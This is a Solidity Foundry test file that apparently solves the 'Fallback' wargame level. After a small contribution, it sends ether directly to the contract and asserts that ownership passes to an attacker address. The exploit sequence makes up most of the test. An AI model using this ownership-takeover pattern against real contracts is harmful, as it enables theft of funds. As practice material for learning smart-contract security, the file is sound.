// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public target;
    function setUp() public {
        target = new Fallback();
    }

    function test_Fallback() public {
        address attacker = makeAddr("attacker");
        uint256 balance = 1 ether;
        vm.deal(attacker, balance);

        address ownerBefore = target.owner();
        assert(ownerBefore != attacker);

        // Attack
        vm.startPrank(attacker);
        target.contribute{value: 0.0001 ether}();
        address(target).call{value: 0.0001 ether}("");

        address ownerAfter = target.owner();
        assertEq(ownerAfter, attacker);
    }
}
